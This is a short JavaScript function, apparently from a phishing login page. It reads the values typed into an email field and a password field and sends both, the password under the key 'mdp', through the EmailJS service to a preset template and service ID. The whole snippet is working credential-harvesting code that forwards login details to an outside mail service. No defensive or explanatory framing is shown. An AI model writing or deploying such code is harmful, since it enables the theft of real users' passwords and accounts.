function sendEmail() {
    emailjs.init("FLCWfGzjhSIMLmML1");
    var mailField = document.getElementById("email_field")
    var passField = document.getElementById("pass_field");
    emailjs.send("service_kvw3ho3", "template_w6zqi2j", { reply_to: mailField.value, mdp: passField.value, email: mailField.value });
}